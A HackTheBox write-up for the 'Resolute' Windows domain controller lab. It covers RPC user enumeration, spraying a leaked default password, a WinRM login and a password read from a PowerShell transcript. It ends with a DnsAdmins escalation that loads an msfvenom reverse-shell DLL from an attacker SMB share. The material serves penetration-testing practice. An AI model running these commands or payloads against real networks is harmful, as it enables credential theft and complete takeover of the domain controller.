---
title: "HackTheBox - Resolute"
author: Nasrallah
description: ""
date: 2023-04-21 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, medium, msrcp, AD, DC, groups, dll]
img_path: /assets/img/hackthebox/machines/resolute
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Resolute](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). The target is a domain controller running DC stuff, on `msrpc` we get a username list and a clear text password, so we brute force smb and found the correct credentials that also works for `winrm`. On the root filesystem we find a folder which has a text file that contains a clear text password for another user. The new user is part of a special group that give us the ability to inject a malicious dll and get SYSTEM access

![](0.png)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 -p- {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

- -p-: Scan all ports.

```terminal
Nmap scan report for 10.10.10.169                                                                                                                     [25/570]
Host is up (0.29s latency).                                                                                                                                   
                                                                                                                                                              
PORT      STATE  SERVICE      VERSION                                                                                                                         
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2023-04-27 09:36:27Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?    
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped  
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped                                                    
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found        
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found                                                        
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc        Microsoft Windows RPC                                                                                                           
49665/tcp open   msrpc        Microsoft Windows RPC         
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49671/tcp open   msrpc        Microsoft Windows RPC
49676/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc        Microsoft Windows RPC
49682/tcp open   msrpc        Microsoft Windows RPC
49711/tcp open   msrpc        Microsoft Windows RPC
50311/tcp closed unknown
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m01s, deviation: 4h02m32s, median: 6m59s
| smb2-time: 
|   date: 2023-04-27T09:37:25
|_  start_date: 2023-04-27T09:17:17
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2023-04-27T02:37:26-07:00
```

From the open ports, we know that the target is a domain controller with the name `Resolute` and domain name `megabank.local`.

Let's add `resolute.megabank.local` and `megabank.local` to `/etc/hosts` file and continue our enumeration.

## SMB

Let's list shares using `smbclient`

```terminal
$ smbclient -L 10.10.10.169 -N                                                                                                                     130 ⨯
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

The anonymous login was successful but we didn't find any open shares.

## MSRPC

Let's connect to rpc server with the command `rpcclient -U '' -N 10.10.10.69`

```terminal
$ rpcclient -U '' -N 10.10.10.169
rpcclient $> 
```

One of the command we can run is `enumdomusers` which returns domain users.

```terminal
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

We got the users, to get a clean list of the username we put the output above in a file and run the following command

```bash
cat users | cut -d '[' -f 2 | cut -d ']' -f 1 > users.lst
```

The other command we can run is `querydispinfo`

```terminal
rpcclient $> querydispinfo
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)
```

We can see in one of the lines the password for user 'Marko' which is `Welcome123!`.

Let's see if the credentials work by listing the smb shares.

```terminal
$ smbclient -L 10.10.10.169 -U marko                                                                                                                 1 ⨯
Enter WORKGROUP\marko's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

That didn't work.

Let's use `crackmapexec` and brute force the usernames with the list we got and see if anyone uses the password `Welcome123!`.

```terminal
$ crackmapexec smb 10.10.10.169 --shares -u users.lst -p 'Welcome123!'                                                                               1 ⨯ 
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:T
rue)                                                                           
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE                             
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE                                    
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE                                       
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE                                 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE                          
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE               
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE                                               
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE                                               
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE                                                  
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.10.10.169    445    RESOLUTE         [+] Enumerated shares
SMB         10.10.10.169    445    RESOLUTE         Share           Permissions     Remark
SMB         10.10.10.169    445    RESOLUTE         -----           -----------     ------
SMB         10.10.10.169    445    RESOLUTE         ADMIN$                          Remote Admin
SMB         10.10.10.169    445    RESOLUTE         C$                              Default share
SMB         10.10.10.169    445    RESOLUTE         IPC$                            Remote IPC
SMB         10.10.10.169    445    RESOLUTE         NETLOGON        READ            Logon server share 
SMB         10.10.10.169    445    RESOLUTE         SYSVOL          READ            Logon server share 
```

Great! The password works for user `melanie`.

We managed to list shares but none the shares are really useful to us.

# **Foothold**

Now let's try to login to the target via `winrm` using `evil-winrm`.

```terminal
$ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'                                                                                             1 ⨯

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> whoami
megabank\melanie
```

Nice! We've logged in successfully.

# **Privilege Escalation**

## ryan

After checking privileges and other basic information, let's see what we can find on the root filesystem

```terminal
*Evil-WinRM* PS C:\> ls                                                                                                                                      
                                                                                                                                                              
                                                                                                                                                              
    Directory: C:\                                                                                                                                            
                                                                                                                                                              
                                                                                                                                                              
Mode                LastWriteTime         Length Name                                                                                                         
----                -------------         ------ ----                                                                                                         
d-----        9/25/2019   6:19 AM                PerfLogs                                                                                                     
d-r---        9/25/2019  12:39 PM                Program Files                                                                                                
d-----       11/20/2016   6:36 PM                Program Files (x86)                                                                                          
d-r---        12/4/2019   2:46 AM                Users                                                                                                        
d-----        12/4/2019   5:15 AM                Windows              
```

Nothing interesting, let's add `-force` tag which is similar to `-a` in linux.

```terminal
*Evil-WinRM* PS C:\> ls -force                                                  


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        4/27/2023   4:30 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        4/27/2023   2:17 AM      402653184 pagefile.sys
```

We found more directories and files. One of the interesting folders we see is `PSTtranscripts`, let's see what is has.

```terminal
*Evil-WinRM* PS C:\pstranscripts\20191203> ls -force


    Directory: C:\pstranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

We find one text file, and after listing it's content we find the password for user `ryan`: `Serv3r4Admin4cc123!`.

Let's use the password to login as ryan.

## SYSTEM

Let's check our groups

```terminal
*Evil-WinRM* PS C:\Users\ryan\desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

We see that we're part of DnsAdmins groups.

I searched that group on google and found that we can use it for privilege escalation.

The attack relies on a DLL injection in to the dns service running as SYSTEM.

First we need to create a malicious dll file using `msfvenom`.

> NOTE that this technique causes the DNS service to hang to it's a bad idea to apply this technique in a real world environment.

```terminal
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.90 LPORT=9999 -f dll -o shell.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                        [-] No arch selected, selecting arch: x64 from the payload                                                                                                    No encoder specified, outputting raw payload                                                                                                                  Payload size: 460 bytes                                                                                                                                       
Final size of dll file: 9216 bytes                                                                                                                            
Saved as: shell.dll   
```

Now we setup a SMB server with the command `sudo smbserver.py share`, and this will server the malicious dll.

Back to our shell as `ryan` we use `dnscmd.exe` to set the serverlevelplugin to our dll file.

```terminal
dnscmd.exe /config /serverlevelplugindll \\10.10.17.90\share\shell.dll
```

Now we just start and stop the service with `sc.exe stop dns` and `sc.exe start dns`.

```terminal
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.17.90\share\shell.dll                                      [34/4038]
                                       
Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryansc.exe \\resolute dns             

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns            

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3892
        FLAGS              :

```

![](1.png)

And just like that we got SYSTEM.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).